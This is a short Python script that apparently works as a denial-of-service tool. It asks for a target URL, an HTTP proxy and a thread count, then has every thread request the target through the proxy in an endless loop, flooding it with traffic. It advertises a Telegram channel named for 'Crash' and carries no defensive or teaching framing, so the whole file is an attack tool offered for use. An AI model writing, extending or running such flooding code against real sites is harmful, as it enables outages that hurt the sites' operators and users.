import urllib
from urllib.request import urlopen, Request
from urllib import request as urlrequest
from threading import Thread
print('Telegram: https://t.me/oymine_Crash')
url = input("Url:")
proxy= input("http proxy:")
thrms = input("Thread: ") 
req = urlrequest.Request(url)
req.set_proxy(proxy, 'http')
def send():
	try:
		while True:
			urlrequest.urlopen(req)
			print("Send packet to proxy: "+proxy)
	except Exception as e:
		print("Произошла ошибка.")
if __name__ == '__main__':
	for i in range (int(thrms)):
		thr = Thread(target=send)
		thr.start()